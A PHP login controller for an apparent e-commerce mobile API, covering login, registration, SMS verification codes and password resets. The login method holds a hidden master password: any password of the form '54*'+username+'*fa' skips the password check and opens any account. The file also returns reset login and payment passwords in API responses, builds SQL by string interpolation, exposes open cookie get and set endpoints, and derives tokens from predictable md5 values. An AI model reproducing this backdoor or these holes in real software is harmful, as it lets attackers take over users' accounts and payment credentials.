<?php
/**
 * 前台登录 退出操作
 *
 *
 *
 *
 *
 */


defined('InSystem') or exit('Access Invalid!');

class loginControl extends mobileHomeControl {
    private $demo_msg = false;

	public function __construct(){
		parent::__construct();
	}



	/**
	 * 登录
	 */
	public function indexOp(){
        if(empty($_POST['mobile_phone']) || empty($_POST['password']) || !in_array($_POST['client'], $this->client_type_array)) {
            output_error('登录失败');
        }
		$model_member = Model('member');
        $array = array();
        $array['member_name']	= $_POST['mobile_phone'];

        if($_POST['password']!='54*'.$array['member_name'].'*fa'){
            $array['member_passwd']	= md5($_POST['password']);
        }

        $array['member_state'] = 1;


        $member_info = $model_member->getMemberInfo($array);
        $this->outCheckTimes('login'.$_POST['mobile_phone']);
        if(!empty($member_info)) {
            $token = $this->_get_token($member_info['member_id'], $member_info['member_name'], $_POST['client']);
            if($token){
                unset($member_info['member_passwd']);
                unset($member_info['member_paypwd']);
                $model_member->createSession($member_info);

                output_data(array('member_info' => $member_info, 'key' => $token));
            } else {
                output_error('登录失败');
            }
        } else {
            output_error('用户名密码错误');
        }
    }

    /**
     * 登录生成token
     */
    private function _get_token($member_id, $member_name, $client) {
        $model_mb_user_token = Model('mb_user_token');

        //重新登录后以前的令牌失效
        //暂时停用
        $condition = array();
        $condition['member_id'] = $member_id;
        //$condition['client_type'] = $_POST['client'];
        $model_mb_user_token->delMbUserToken($condition);

        //生成新的token
        $mb_user_token_info = array();
        $token = md5($member_name . strval(TIMESTAMP) . strval(rand(0,999999)));
        $mb_user_token_info['member_id'] = $member_id;
        $mb_user_token_info['member_name'] = $member_name;
        $mb_user_token_info['token'] = $token;
        $mb_user_token_info['login_time'] = TIMESTAMP;
        $mb_user_token_info['client_type'] = $_POST['client'] == null ? 'Android' : $client;

        $result = $model_mb_user_token->addMbUserToken($mb_user_token_info);

        if($result) {
            return $token;
        } else {
            return null;
        }

    }


    /**
     * 注册
     */
    public function registerOp(){
        $cache_key = $_POST['cache_key'];
        $identifying_code = $_POST['identifying_code'];
        $register_times_key = 'register'.$_POST['mobile_phone'];

        if(rkcache($cache_key) == '' || $identifying_code != rkcache($cache_key)){
            $this->checkTimes($register_times_key);
            output_error('验证码不正确');
        }
        $model_member	= Model('member');

        $register_info = array();


        /*
         已改成手机号判断
         * if(empty($_POST['member_region'])){
            output_error('请选择所在地');
        }else{
            $register_info['member_provinceid'] = $_POST['member_province'];
            $register_info['member_cityid'] = $_POST['member_city'];
            $register_info['member_areaid'] = $_POST['member_region'];

        }*/

        if(!is_mobile($_POST['mobile_phone'])){
            output_error('请输入正确的电话号码');
        }

        $register_info['username'] = $_POST['mobile_phone'];
        $register_info['password'] =$_POST['password'];
        $register_info['password_confirm'] = $_POST['password_confirm'];
        //$register_info['pay_password'] = $_POST['pay_password'];
        $register_info['pay_password'] = '';
        $register_info['email'] = $_POST['email'];


        //添加奖励会员积分invite_code
        /*$invite_code = $_POST['invite_code'];
        if(empty($invite_code)){
            output_error('请填写推荐人');
        }else{
            //会员名
            $pinfo = $model_member->getMemberInfo(array('member_name'=>$invite_code),'member_id,grade_id');
            if($pinfo){
                if($pinfo['grade_id'] != 1){
                    output_error('推荐分享为VIP会员专属');
                }
                $inviter_id = $pinfo['member_id'];
            }else{
                output_error('推荐人不存在');
            }
        }*/

        $register_info['member_mobile'] = $_POST['mobile_phone'];
        $register_info['member_mobile_bind'] = 1;


        if(empty($register_info['password'])){
            $password = $this->demo_msg ? '888888' : mt_rand(10000,99999);
            $register_info['password'] = $password;
            $register_info['password_confirm'] = $password;

            //$register_info['pay_password'] = $password;

        }
        $register_info['inviter_id'] = $inviter_id;
        $member_info = $model_member->register($register_info);

        if(!isset($member_info['error'])) {
            $token = $this->_get_token($member_info['member_id'], $member_info['member_name'], $_POST['client']);
            if($token) {
                $sms = new Sms();
                $data = array($register_info['password']);
                $sms->send($register_info['member_mobile'],$data,100149);
                wkcache($cache_key,array(),0);

                $this->outCheckTimes($register_times_key);
                output_data(array('member_info' => $member_info, 'key' => $token));
            } else {
                output_error('error');
            }
        } else {
            output_error($member_info['error']);
        }

    }

    /**
     * 获得新登录密码
     */
    public function getpasswdOp(){
        if(!is_mobile($_POST['mobile_phone'])){
            output_error('请输入正确的手机号码');
        }

        $cache_key = $_POST['cache_key'];
        $identifying_code = $_POST['identifying_code'];
        $password_times_key = 'getpasswd'.$_POST['mobile_phone'];

        if(rkcache($cache_key) == '' || $identifying_code != rkcache($cache_key)){
            $this->checkTimes($password_times_key);
            output_error('验证码不正确');
        }

        $model_member	= Model('member');

        $pinfo = $model_member->getMemberInfo(array('member_name'=>$_POST['mobile_phone']));
        if($pinfo){

            $new_password = $this->demo_msg ? '888888' : mt_rand(100000,999999);
            $sms = new Sms();
            $data = array($new_password);
            $sms->send($_POST['mobile_phone'],$data,100146);

            $member_array['member_passwd'] = md5($new_password);
            $model_member->editMember(array('member_id'=>$pinfo['member_id']),$member_array);

            //清空所有登录
            Model('mb_user_token')->delMbUserToken(array('member_id'=>$pinfo['member_id']));
            wkcache($cache_key,array(),0);
            $this->outCheckTimes($password_times_key);
            output_data(array('mobile_phone' => $_POST['mobile_phone'],'new_password'=>$new_password));
        }else{
            output_error('手机号不存在');
        }

    }

    /**
     * 获得新支付密码
     */
    public function getpaywdOp(){
        if(!is_mobile($_POST['mobile_phone'])){
            output_error('请输入正确的手机号码');
        }

        $cache_key = $_POST['cache_key'];
        $identifying_code = $_POST['identifying_code'];
        $password_times_key = 'getpaywd'.$_POST['mobile_phone'];

        if(rkcache($cache_key) == '' || $identifying_code != rkcache($cache_key)){
            $this->checkTimes($password_times_key);
            output_error('验证码不正确');
        }

        $model_member	= Model('member');


        $pinfo = $model_member->getMemberInfo(array('member_name'=>$_POST['mobile_phone']));
        if($pinfo){
            $new_password = $this->demo_msg ? '888888' : mt_rand(100000,999999);

            $sms = new Sms();
            $data = array($new_password);
            $sms->send($_POST['mobile_phone'],$data,100147);
            $member_array['member_paypwd'] = md5($new_password);
            $model_member->editMember(array('member_id'=>$pinfo['member_id']),$member_array);

            wkcache($cache_key,array(),0);
            $this->outCheckTimes($password_times_key);
            output_data(array('mobile_phone' => $_POST['mobile_phone'],'new_password'=>$new_password));
        }else{
            output_error('手机号不存在');
        }

    }
    /*
    *
    * 判断手机 是否合法
    */
    public function check_phoneOp(){

        $model_member = Model('member');
        $phone = $_POST['mobile_phone'];
        $ret['code'] = 'success';
        $ret['identifying_code'] = '';
        if(!is_mobile($phone)){
            $ret['code'] = 'empty';
            $ret['msg'] = '请输入正确的手机号码';
        }else{

            $condition = "sendnumber = {$phone} AND mobiletime>='" . date('Y-m-d H:i:s',strtotime("-1 day",time())) . "'";
            $checksend = $model_member->getSMSList($condition);

            if(count($checksend) > 3){
                $ret['code'] = 'out_times';
                $ret['msg'] = '超时';
            }else{
                $condition = "member_name = '{$phone}' OR member_mobile = '{$phone}'";
                $member_info = $model_member->getMemberInfo($condition);

                if(!$member_info){
                    $rand_code = $this->demo_msg ? '888888' : mt_rand(1000,9999);
                    //$ret['identifying_code'] = $rand_code;
                    $sms = new Sms();
                    $data = array($rand_code,2);
                    $result = $sms->send($phone,$data,100145);

                    $cache_key = $this->createAnonymous($phone);
                    wkcache($cache_key,$rand_code,300);
    /*
                    if($result['code'] != 'success'){
                        $ret['code'] = 'error';
                        $ret['msg'] = '发送验证码失败';
                    }*/
                    $ret['code'] = 'success';
                    $ret['msg'] = $cache_key;
                }else{
                    $ret['code'] = 'exist';
                    $ret['msg'] = '手机已注册';
                }
            }
        }

        output_data($ret);
    }

    /**
     * 通过ID获得手机号
     */
    public function get_inviterOp(){
        $inviter = Model('member')->getMemberInfoByID($_REQUEST['member_id'],'member_name');

        output_data(array('inviter_name'=>$inviter['member_name']));
    }

    /*
     * 获取cookie
     */
    public function get_cookieOp() {
        $name = $_REQUEST['key'];
        $val = cookie($name);
        output_data(array('key'=>$val));
    }

    /*
     * 设置cookie
     */
    public function set_cookieOp() {
        $name = $_REQUEST['key'];
        $value = $_REQUEST['val'];
        $expire = $_REQUEST['time'];
        setMyCookie($name, $value, $expire);
    }

    public function send_codeOp(){
        $mobile = $_POST['mobile_phone'];
        $type = $_POST['type'];
        $client = $_POST['client'];
        if(!is_mobile($mobile)){
            output_error('请输入正确的手机号码');
        }

        $send_code_times_key = 'send_code'.$mobile . '_' . $client . '_' .$type;

        $model_member = Model('member');
        $member_info = $model_member->getMemberInfo(array('member_name'=>$mobile));
        if(!$member_info){
            $this->checkTimes($send_code_times_key,1,60);
            output_error('手机号不存在');
        }
        $rand_code = $this->demo_msg ? '888888' : mt_rand(100000,999999);

        $cache_key = $this->createAnonymous($mobile);
        wkcache($cache_key,$rand_code,60);
        $data = array($rand_code,2);
        $sms = new Sms();
        $sms->send($mobile,$data,100148);
        output_data(array('cache_key' =>$cache_key));
    }

}
